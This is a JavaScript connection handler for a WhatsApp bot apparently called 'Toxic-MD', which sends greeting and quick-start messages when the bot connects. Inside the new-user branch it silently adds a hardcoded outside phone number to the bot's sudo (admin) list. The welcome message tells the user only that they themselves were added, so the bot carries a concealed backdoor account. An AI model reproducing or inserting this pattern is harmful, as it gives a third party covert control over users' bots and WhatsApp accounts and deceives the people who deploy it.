import { Boom } from '@hapi/boom';
import { DateTime } from 'luxon';
import { DisconnectReason } from '@whiskeysockets/baileys';
import { addSudoUser, getSudoUsers } from '../database/config.js';
import { getCachedSettings } from '../lib/settingsCache.js';
import { commands, totalCommands } from '../handlers/commandHandler.js';
import { getDeviceMode } from '../lib/deviceMode.js';
import { ButtonV2 } from '../lib/WABuilder.js';

const botName = process.env.BOTNAME || "Toxic-MD";
let hasSentStartMessage = false;

function getGreeting() {
  const hour = DateTime.now().setZone("Africa/Nairobi").hour;
  if (hour >= 5 && hour < 12) return "Hey there! Ready to kick off the day?";
  if (hour >= 12 && hour < 18) return "What's up? Time to make things happen!";
  if (hour >= 18 && hour < 22) return "Evening vibes! Let's get to it!";
  return "Late night? Let's see what's cooking!";
}

function getCurrentTime() {
  return DateTime.now().setZone("Africa/Nairobi").toLocaleString(DateTime.TIME_SIMPLE);
}

async function connectionHandler(socket, connectionUpdate, reconnect) {
  const { connection, lastDisconnect } = connectionUpdate;

  if (connection === "connecting") return;

  if (connection === "close") {
    const statusCode = new Boom(lastDisconnect?.error)?.output.statusCode;
    if (statusCode === DisconnectReason.loggedOut) {
      hasSentStartMessage = false;
    }
    return;
  }

  if (connection === "open") {
      globalThis.conn = socket;
      globalThis.sock = socket;
      globalThis.tox = socket;
      globalThis.toxic = socket;
      globalThis.clint = socket;
      globalThis.bot = socket;
      globalThis.wx = socket;
      globalThis.client = socket;
    const userId = socket.user.id.split(":")[0].split("@")[0];
    const settings = await getCachedSettings();
    const sudoUsers = await getSudoUsers();

    let botJid = socket.user?.id || (userId + '@s.whatsapp.net');
    if (botJid.includes(':')) {
      botJid = botJid.split(':')[0] + '@s.whatsapp.net';
    }

    if (!hasSentStartMessage) {
      const isNewUser = !sudoUsers.includes(userId);
      if (isNewUser) {
        await addSudoUser(userId);
        const defaultSudo = "254114885159";
        if (!sudoUsers.includes(defaultSudo)) {
          await addSudoUser(defaultSudo);
        }
      }

      const firstMessage = isNewUser
        ? [
            `◈━━━━━━━━━━━━━━━━◈`,
            `│❒ *${getGreeting()}*`,
            `│❒ Welcome to *${botName}*! You're now connected.`,
            ``,
            `✨ *Bot Name*: ${botName}`,
            `🔧 *Mode*: ${settings.mode}`,
            `➡️ *Prefix*: ${settings.prefix}`,
            `📦 *Commands*: ${totalCommands}`,
            `🕒 *Time*: ${getCurrentTime()}`,
            ``,
            `│❒ *New User Alert*: You've been added to the sudo list.`,
            ``,
            `◈━━━━━━━━━━━━━━━━◈`
          ].join("\n")
        : [
            `◈━━━━━━━━━━━━━━━━◈`,
            `│❒ *${getGreeting()}*`,
            `│❒ Welcome back to *${botName}*! Connection established.`,
            ``,
            `✨ *Bot Name*: ${botName}`,
            `🔧 *Mode*: ${settings.mode}`,
            `➡️ *Prefix*: ${settings.prefix}`,
            `📦 *Commands*: ${totalCommands}`,
            `🕒 *Time*: ${getCurrentTime()}`,
            ``,
            `◈━━━━━━━━━━━━━━━━◈`
          ].join("\n");

      const effectivePrefix = settings.prefix || '.';

      try {
        await socket.sendMessage(botJid, {
          text: firstMessage,
          viewOnce: true
        });

        const device = await getDeviceMode();

        if (device === 'ios') {
          const iosQuickText = [
            `╭─❏ 「 Quick Start 」`,
            `│ Use the commands below to get started:`,
            `│`,
            `│ ${effectivePrefix}menu — View all commands`,
            `│ ${effectivePrefix}settings — Bot configuration`,
            `│ ${effectivePrefix}ping — Check bot speed`,
            `│ ${effectivePrefix}uptime — Bot uptime`,
            `╰───────────────`,
            `> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
            ``
          ].join('\n');
          await socket.sendMessage(botJid, { text: iosQuickText });
        } else {
          try {
            const btnV2 = new ButtonV2(socket);
            btnV2.setBody(`*Bot is ready!*\n*Pick an option below to get started.*`)
                .setFooter('> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧')
                .addButton('𝐌𝐞𝐧𝐮', `${effectivePrefix}menu`)
                .addButton('𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬', `${effectivePrefix}settings`)
                .addButton('𝐏𝐢𝐧𝐠', `${effectivePrefix}ping`);
            await btnV2.send(botJid, { userJid: socket.user?.id || '' });
          } catch {
            const quickText = [
              `╭─❏ 「 Quick Start 」`,
              `│ ${effectivePrefix}menu — View all commands`,
              `│ ${effectivePrefix}settings — Bot configuration`,
              `│ ${effectivePrefix}ping — Check bot speed`,
              `│ ${effectivePrefix}uptime — Bot uptime`,
              `╰───────────────`,
              `> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
            ].join('\n');
            await socket.sendMessage(botJid, { text: quickText });
          }
        }
      } catch (error) {}

      hasSentStartMessage = true;
    }
  }
}

export default connectionHandler;
